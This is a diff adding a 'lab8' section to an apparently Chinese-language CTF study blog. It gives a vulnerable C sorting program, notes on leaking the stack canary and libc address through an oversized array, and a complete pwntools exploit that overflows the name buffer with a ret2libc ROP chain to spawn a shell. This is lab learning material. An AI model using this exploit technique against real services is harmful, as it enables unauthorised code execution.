@@ -542,6 +542,129 @@ r.interactive()
 
 ![image-20220107223840052](/assets/img/2022/image-20220107223840052.png)
 
+
+
+### # lab8
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int comp(const void *lhs, const void *rhs)
+{
+  long long f = *((long long *)lhs);
+  long long s = *((long long *)rhs);
+  if (f > s) return 1;
+  if (f < s) return -1;
+  return 0;
+}
+
+int main()
+{
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+
+  char name[16];  //[rbp-20h]
+  long long arr[10000]; //[rbp-138A0h]
+  int size;
+  puts("Welcome to the sorting service!");
+  puts("Please enter array size (1~10000):");
+  scanf("%d", &size);
+  puts("Please enter the array:");
+  for (int i = 0; i < size; ++i) {
+    long long temp;
+    scanf("%lld", &temp);
+    if (temp >= 0) {
+      arr[i] = temp;
+    }
+  }
+  qsort(arr, size, sizeof(long long), comp);
+  puts("Here is the result");
+  for (int i = 0; i < size; ++i) {
+    printf("%lld ", arr[i]);
+  }
+  puts("");
+  puts("Please leave your name:");
+  read(0, name, 0x90);
+  puts("Thank you for using our service!");
+}
+```
+
+![image-20220108222730293](/assets/img/2022/image-20220108222730293.png)
+
+>总的思路是 通过给一个很大的size，利用36行把栈里的数据都给打印出来。
+>
+>有两个数据比较关键：
+>
+>- `rbp-0x8`是canary，因为后续还要利用`read(0, name, 0x90);`这行的栈溢出，所以要先搞到canary，再栈溢出利用的时候把canary再塞回去，保证canary的check检查通过
+>- `rbp+0x8`是`__libc_start_main+231`,  拿到这个值，再减去231，就是`__libc_start_main`的实际地址了，`__libc_start_main`的实际地址减去`__libc_start_main`的offset（从readelf或者elf.symbols获取），就可以得到libc的基地址了。
+>
+>![image-20220108224336847](/assets/img/2022/image-20220108224336847.png)
+
+
+
+![image-20220108225108377](/assets/img/2022/image-20220108225108377.png)
+
+![image-20220108222526580](/assets/img/2022/image-20220108222526580.png)
+
+不过好像成功率就一半，有时候只能搞到2个值，也不知道是为啥，这种情况就GG了
+
+![image-20220108225225942](/assets/img/2022/image-20220108225225942.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./sort', env={"LD_PRELOAD":"./libc-2.27.so"})
+libc = ELF('./libc-2.27.so')
+# context.log_level="debug"
+# pause()
+
+r.recvuntil("(1~10000):")
+size = (0x138A0/8+2)
+r.sendline(str(size))
+r.recvuntil('array:\n')
+for i in range(size):
+    if i < (size-3):
+        r.sendline(str(0))
+    else:
+        r.sendline(str(-1))
+r.recvuntil('result\n')
+arr = r.recvline().split(' ')
+print(arr[-5:])
+canary = int(arr[-2])
+libc_start_main = int(arr[-3]) - 231
+libc_start_main_offset = libc.symbols['__libc_start_main']
+libc_base = libc_start_main - libc_start_main_offset
+# pause()
+# print(hex(canary))
+r.recvuntil('name:')
+
+pop_rdi = 0x000000000002155f # pop rdi ; ret
+ret = 0x00000000000008aa # ret
+sh = 0x00000000001b3e9a # /bin/sh
+system_libc_offset = libc.symbols['system']
+
+p = 'a'*(8*3) + p64(canary) + 'a'*8
+p += p64(libc_base + pop_rdi)
+p += p64(libc_base + sh)
+p += p64(libc_base + ret)
+p += p64(libc_base + system_libc_offset)
+# one_gadget
+# p += p64(libc_base + 0x4f322)
+
+r.send(p)
+
+r.interactive()
+```
+
+
+
+
+
 ##  CTF wiki
 
 ## 基本ROP
